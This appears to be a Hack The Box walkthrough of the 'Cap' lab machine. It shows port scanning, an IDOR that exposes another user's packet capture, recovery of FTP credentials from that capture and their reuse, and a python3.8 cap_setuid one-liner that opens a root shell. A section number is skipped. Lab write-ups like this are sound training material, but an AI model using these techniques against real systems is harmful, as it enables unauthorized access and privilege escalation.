# Hack The Box - Cap Walkthrough

**Target:** Cap  
**OS:** Linux  
**Difficulty:** Easy  

---

## 1. Enumeration

### Port Scanning
We begin by scanning the target IP with `nmap` to discover running services:

```bash
nmap -sC -sV -oA nmap/cap <TARGET_IP>
```

**Question:** How many TCP ports are open?

**Answer:** `3` (Port 21 - FTP, Port 22 - SSH, Port 80 - HTTP)

---

## 2. Web Application Analysis & PCAP Analysis

Navigating to `http://<TARGET_IP>` in the web browser reveals a dashboard monitoring network security.

Clicking on **Security Snapshot** in the navigation menu triggers a brief network capture and redirects the browser to a path structured as `http://<TARGET_IP>/data/1`.

**Question:** After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

**Answer:** `data`

### Insecure Direct Object Reference (IDOR)

The path structure `/data/[id]` indicates a potential IDOR vulnerability. By modifying the `[id]` parameter in the URL path from `1` to `0` (`http://<TARGET_IP>/data/0`), we can access packet captures generated by other users or previous system scans.

**Question:** Are you able to get to other users' scans?

**Answer:** `Yes`

### PCAP File Exfiltration

Download the `.pcap` file associated with scan ID 0 (`0.pcap`) and open it using Wireshark:

```bash
wireshark 0.pcap &

```

**Question:** What is the ID of the PCAP file that contains sensitive data?

**Answer:** `0`

### Analyzing Traffic for Credentials

Inside Wireshark, filtering by unencrypted protocols reveals cleartext traffic passed over the FTP protocol.

**Question:** Which application layer protocol in the pcap file can the sensitive data be found in?

**Answer:** `FTP`

Apply the Wireshark filter:

```text
ftp

```

Locate the packets containing the `USER` and `PASS` commands:

* **Username:** `nathan`
* **Password:** *(Retrieved from PCAP)*

With `nathan`'s credentials, we attempt to reuse the password across other open services.

## 4. Privilege Escalation

After gaining initial access, we inspect the system for misconfigurations—specifically focusing on Linux Capabilities.

### Checking Linux Capabilities

Run `getcap` recursively across the filesystem:

```bash
getcap -r / 2>/dev/null

```

**Output:**

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```

The `/usr/bin/python3.8` binary has the `cap_setuid` capability enabled, allowing any user executing Python to set their Effective User ID to `0` (root).

**Question:** What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?

**Answer:** `/usr/bin/python3.8`

### Exploiting `cap_setuid` for Root

We leverage Python's `os` module to set the Process UID to `0` and spawn a root bash shell:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

Verify root privileges:

```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root)

```

**Question:** Submit the flag located in root's home directory.

**Command:**

```bash
cat /root/root.txt

```
